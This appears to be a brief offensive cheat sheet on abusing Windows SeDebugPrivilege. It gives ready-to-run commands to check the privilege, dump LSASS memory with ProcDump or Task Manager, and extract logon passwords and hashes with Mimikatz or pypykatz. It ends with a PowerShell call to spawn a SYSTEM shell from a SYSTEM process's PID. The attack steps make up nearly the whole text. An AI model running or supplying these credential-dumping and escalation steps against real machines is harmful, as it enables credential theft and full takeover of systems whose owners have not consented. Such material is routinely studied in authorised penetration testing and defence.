# SeDebugPrivilege

## 1. Verify SeDebugPrivilege

```powershell
whoami /priv
```

*Look for: `SeDebugPrivilege` - **Enabled** means you can interact with SYSTEM-level processes.*

---

## 2. Dump LSASS

### Using Sysinternals ProcDump:

```powershell
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

### Using Task Manager:

* Task Manager - **Details** tab
* Right-click **lsass.exe** - **Create dump file**

---

## 3. Extract Credentials

### With Mimikatz:

```powershell
mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

### From Linux / Non-Windows (pypykatz):

```bash
pypykatz lsa minidump lsass.dmp
```

---

## 4. RCE as SYSTEM (Token Abuse)

### PowerShell CreateProcessFromParent example:

```powershell
[MyProcess]::CreateProcessFromParent(<PID>,"cmd.exe","")
```

*Use the PID of a SYSTEM process to spawn a **SYSTEM shell**.
